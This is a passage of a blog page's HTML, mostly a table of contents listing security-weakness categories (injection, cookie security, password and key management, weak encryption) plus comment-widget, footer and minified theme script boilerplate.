class="toc-number">1.4.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Setting-Manipulation-User-Controlled-Whitelist"><span class="toc-number">1.4.30.</span> <span class="toc-text">Setting Manipulation: User-Controlled Whitelist</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-46"><span class="toc-number">1.4.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-46"><span class="toc-number">1.4.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-46"><span class="toc-number">1.4.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-45"><span class="toc-number">1.4.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML-Injection"><span class="toc-number">1.4.31.</span> <span class="toc-text">XML Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-47"><span class="toc-number">1.4.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-47"><span class="toc-number">1.4.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-47"><span class="toc-number">1.4.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-46"><span class="toc-number">1.4.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安全特性"><span class="toc-number">1.5.</span> <span class="toc-text">安全特性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Access-Control-Azure"><span class="toc-number">1.5.1.</span> <span class="toc-text">Access Control: Azure</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-48"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-48"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-48"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-47"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Access-Control-Database"><span class="toc-number">1.5.2.</span> <span class="toc-text">Access Control: Database</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-49"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-49"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-49"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-48"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AngularJS-Misconfiguration-Dangerous-Protocol-Allowed"><span class="toc-number">1.5.3.</span> <span class="toc-text">AngularJS Misconfiguration: Dangerous Protocol Allowed</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-50"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-50"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-50"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-49"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AngularJS-Misconfiguration-Strict-Contextual-Escaping-Disabled"><span class="toc-number">1.5.4.</span> <span class="toc-text">AngularJS Misconfiguration: Strict Contextual Escaping Disabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-51"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-51"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-51"><span class="toc-number">1.5.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-50"><span class="toc-number">1.5.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie-Security-Cookie-not-Sent-Over-SSL"><span class="toc-number">1.5.5.</span> <span class="toc-text">Cookie Security: Cookie not Sent Over SSL</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-52"><span class="toc-number">1.5.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-52"><span class="toc-number">1.5.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-52"><span class="toc-number">1.5.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-51"><span class="toc-number">1.5.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie-Security-HTTPOnly-not-Set"><span class="toc-number">1.5.6.</span> <span class="toc-text">Cookie Security: HTTPOnly not Set</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-53"><span class="toc-number">1.5.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-53"><span class="toc-number">1.5.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-53"><span class="toc-number">1.5.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-52"><span class="toc-number">1.5.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie-Security-Overly-Broad-Domain"><span class="toc-number">1.5.7.</span> <span class="toc-text">Cookie Security: Overly Broad Domain</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-54"><span class="toc-number">1.5.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-54"><span class="toc-number">1.5.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-54"><span class="toc-number">1.5.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-53"><span class="toc-number">1.5.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie-Security-Overly-Broad-Path"><span class="toc-number">1.5.8.</span> <span class="toc-text">Cookie Security: Overly Broad Path</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-55"><span class="toc-number">1.5.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-55"><span class="toc-number">1.5.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-55"><span class="toc-number">1.5.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-54"><span class="toc-number">1.5.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Randomness"><span class="toc-number">1.5.9.</span> <span class="toc-text">Insecure Randomness</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-56"><span class="toc-number">1.5.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-56"><span class="toc-number">1.5.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-56"><span class="toc-number">1.5.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-55"><span class="toc-number">1.5.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-SSL-Server-Identity-Verification-Disabled"><span class="toc-number">1.5.10.</span> <span class="toc-text">Insecure SSL: Server Identity Verification Disabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-57"><span class="toc-number">1.5.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-57"><span class="toc-number">1.5.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-57"><span class="toc-number">1.5.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-56"><span class="toc-number">1.5.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Transport"><span class="toc-number">1.5.11.</span> <span class="toc-text">Insecure Transport</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-58"><span class="toc-number">1.5.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-58"><span class="toc-number">1.5.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-58"><span class="toc-number">1.5.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-57"><span class="toc-number">1.5.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Transport-HSTS-not-Set"><span class="toc-number">1.5.12.</span> <span class="toc-text">Insecure Transport: HSTS not Set</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-59"><span class="toc-number">1.5.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-59"><span class="toc-number">1.5.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-59"><span class="toc-number">1.5.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-58"><span class="toc-number">1.5.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Transport-Weak-SSL-Protocol"><span class="toc-number">1.5.13.</span> <span class="toc-text">Insecure Transport: Weak SSL Protocol</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-60"><span class="toc-number">1.5.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-60"><span class="toc-number">1.5.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-60"><span class="toc-number">1.5.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-59"><span class="toc-number">1.5.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Key-Management-Empty-Encryption-Key"><span class="toc-number">1.5.14.</span> <span class="toc-text">Key Management: Empty Encryption Key</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-61"><span class="toc-number">1.5.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-61"><span class="toc-number">1.5.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-61"><span class="toc-number">1.5.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-60"><span class="toc-number">1.5.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Key-Management-Hardcoded-Encryption-Key"><span class="toc-number">1.5.15.</span> <span class="toc-text">Key Management: Hardcoded Encryption Key</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-62"><span class="toc-number">1.5.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-62"><span class="toc-number">1.5.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-62"><span class="toc-number">1.5.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-61"><span class="toc-number">1.5.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Key-Management-Null-Encryption-Key"><span class="toc-number">1.5.16.</span> <span class="toc-text">Key Management: Null Encryption Key</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-63"><span class="toc-number">1.5.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-63"><span class="toc-number">1.5.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-63"><span class="toc-number">1.5.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-62"><span class="toc-number">1.5.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management"><span class="toc-number">1.5.17.</span> <span class="toc-text">Password Management</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-64"><span class="toc-number">1.5.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-64"><span class="toc-number">1.5.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-64"><span class="toc-number">1.5.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-63"><span class="toc-number">1.5.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Empty-Password"><span class="toc-number">1.5.18.</span> <span class="toc-text">Password Management: Empty Password</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-65"><span class="toc-number">1.5.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-65"><span class="toc-number">1.5.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-65"><span class="toc-number">1.5.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-64"><span class="toc-number">1.5.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Hardcoded-Password"><span class="toc-number">1.5.19.</span> <span class="toc-text">Password Management: Hardcoded Password</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-66"><span class="toc-number">1.5.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-66"><span class="toc-number">1.5.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-66"><span class="toc-number">1.5.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-65"><span class="toc-number">1.5.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Null-Password"><span class="toc-number">1.5.20.</span> <span class="toc-text">Password Management: Null Password</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-67"><span class="toc-number">1.5.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-67"><span class="toc-number">1.5.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-67"><span class="toc-number">1.5.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-66"><span class="toc-number">1.5.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Password-in-Comment"><span class="toc-number">1.5.21.</span> <span class="toc-text">Password Management: Password in Comment</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-68"><span class="toc-number">1.5.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-68"><span class="toc-number">1.5.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-68"><span class="toc-number">1.5.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-67"><span class="toc-number">1.5.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Password-Management-Weak-Cryptography"><span class="toc-number">1.5.22.</span> <span class="toc-text">Password Management: Weak Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-69"><span class="toc-number">1.5.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-69"><span class="toc-number">1.5.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-69"><span class="toc-number">1.5.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-68"><span class="toc-number">1.5.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Privacy-Violation"><span class="toc-number">1.5.23.</span> <span class="toc-text">Privacy Violation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-70"><span class="toc-number">1.5.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-70"><span class="toc-number">1.5.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-70"><span class="toc-number">1.5.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-69"><span class="toc-number">1.5.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Weak-Cryptographic-Hash"><span class="toc-number">1.5.24.</span> <span class="toc-text">Weak Cryptographic Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-71"><span class="toc-number">1.5.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-71"><span class="toc-number">1.5.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-71"><span class="toc-number">1.5.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-70"><span class="toc-number">1.5.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Weak-Encryption"><span class="toc-number">1.5.25.</span> <span class="toc-text">Weak Encryption</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-72"><span class="toc-number">1.5.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-72"><span class="toc-number">1.5.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-72"><span class="toc-number">1.5.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-71"><span class="toc-number">1.5.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Weak-Encryption-Insufficient-Key-Size"><span class="toc-number">1.5.26.</span> <span class="toc-text">Weak Encryption: Insufficient Key Size</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-73"><span class="toc-number">1.5.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-73"><span class="toc-number">1.5.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-73"><span class="toc-number">1.5.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-72"><span class="toc-number">1.5.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#时间和状态"><span class="toc-number">1.6.</span> <span class="toc-text">时间和状态</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Race-Condition"><span class="toc-number">1.6.1.</span> <span class="toc-text">Race Condition</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-74"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-74"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-74"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-73"><span class="toc-number">1.6.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li></ol></li></ol>
                    </div>
                </span>
            </div>
        </div>
        
    </div>
</aside>



  
  
  

  

  
    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
      <div id="vcomment" class="comment"></div> 
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
   var notify = 'false' == true ? true : false;
   var verify = 'false' == true ? true : false;
    window.onload = function() {
        new Valine({
            el: '#vcomment',
            notify: notify,
            verify: verify,
            app_id: "cPIja8hEdmK0DO1mNhmKUtdb-gzGzoHsz",
            app_key: "rAG7JWw8FX9LqnHJj0NTvGdW",
            placeholder: "兄弟姐妹们，别默默地路过，吐槽下嘛～～～",
            avatar:"hide"
        });
    }
</script>

    </section>
  

  

  


          </div>
        </div>
      </div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2020 QingYu
    	</div>
      	<div class="footer-right">
      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
      	</div>
    </div>
  </div>
  

        <!-- 不蒜子统计   
        <span id="busuanzi_container_site_pv" style='display:none'>
                本站总访问量<span id="busuanzi_value_site_pv"></span>次
        </span>
        <span class="post-meta-divider">|</span> 
        -->
        <span id="busuanzi_container_site_uv" >
                您是本博客第<span id="busuanzi_value_site_uv"></span>个访客，qingyu欢迎您的到来~
        </span>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


</footer>



<!--页面点击小红心-->
<script type="text/javascript" src="/love.js"></script>
    </div>
    <script>
	var yiliaConfig = {
		mathjax: false,
		isHome: false,
		isPost: true,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false,
		toc_hide_index: true,
		root: "/",
		innerArchive: true,
		showTags: false
	}
</script>

<script>!function(t){function n(e){if(r[e])return r[e].exports;var i=r[e]={exports:{},id:e,loaded:!1};return t[e].call(i.exports,i,i.exports,n),i.loaded=!0,i.exports}var r={};n.m=t,n.c=r,n.p="./",n(0)}([function(t,n,r){r(195),t.exports=r(191)},function(t,n,r){var e=r(3),i=r(52),o=r(27),u=r(28),c=r(53),f="prototype",a=function(t,n,r){var s,l,h,v,p=t&a.F,d=t&a.G,y=t&a.S,g=t&a.P,b=t&a.B,m=d?e:y?e[n]||(e[n]={}):(e[n]||{})[f],x=d?i:i[n]||(i[n]={}),w=x[f]||(x[f]={});d&&(r=n);for(s in r)l=!p&&m&&void 0!==m[s],h=(l?m:r)[s],v=b&&l?c(h,e):g&&"function"==typeof h?c(Function.call,h):h,m&&u(m,s,h,t&a.U),x[s]!=h&&o(x,s,v),g&&w[s]!=h&&(w[s]=h)};e.core=i,a.F=1,a.G=2,a.S=4,a.P=8,a.B=16,a.W=32,a.U=64,a.R=128,t.exports=a},function(t,n,r){var e=r(6);t.exports=function(t){if(!e(t))throw TypeError(t+" is not an object!");return t}},function(t,n){var r=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=r)},function(t,n){t.exports=function(t){try{return!!t()}catch(t){return!0}}},function(t,n){var r=t.exports="undefined"!=typeof window&&window.Math==Math?window:"undefined"!=typeof self&&self.Math==Math?self:Function("return this")();"number"==typeof __g&&(__g=r)},function(t,n){t.exports=function(t){return"object"==typeof t?null!==t:"function"==typeof t}},function(t,n,r){var e=r(126)("wks"),i=r(76),o=r(3).Symbol,u="function"==typeof o;(t.exports=function(t){return e[t]||(e[t]=u&&o[t]||(u?o:i)("Symbol."+t))}).store=e},function(t,n){var r={}.hasOwnProperty;t.exports=function(t,n){return r.call(t,n)}},function(t,n,r){var e=r(94),i=r(33);t.exports=function(t){return e(i(t))}},function(t,n,r){t.exports=!r(4)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,r){var e=r(2),i=r(167),o=r(50),u=Object.defineProperty;n.f=r(10)?Object.defineProperty:function(t,n,r){if(e(t),n=o(n,!0),e(r),i)try{return u(t,n,r)}catch(t){}if("get"in r||"set"in r)throw TypeError("Accessors not supported!");return"value"in r&&(t[n]=r.value),t}},function(t,n,r){t.exports=!r(18)(function(){return 7!=Object.defineProperty({},"a",{get:function(){return 7}}).a})},function(t,n,r){var e=r(14),i=r(22);t.exports=r(12)?function(t,n,r){return e.f(t,n,i(1,r))}:function(t,n,r){return t[n]=r,t}},function(t,n,r){var e=r(20),i=r(58),o=r(42),u=Object.defineProperty;n.f=r(12)?Object.defineProperty:function(t,n,r){if(e(t),n=o(n,!0),e(r),i)try{return u(t,n,r)}catch(t){}if("get"in r||"set"in r)throw TypeError("Accessors not supported!");return"value"in r&&(t[n]=r.value),t}},function(t,n,r){var e=r(40)("wks"),i=r(23),o=r(5).Symbol,u="function"==typeof 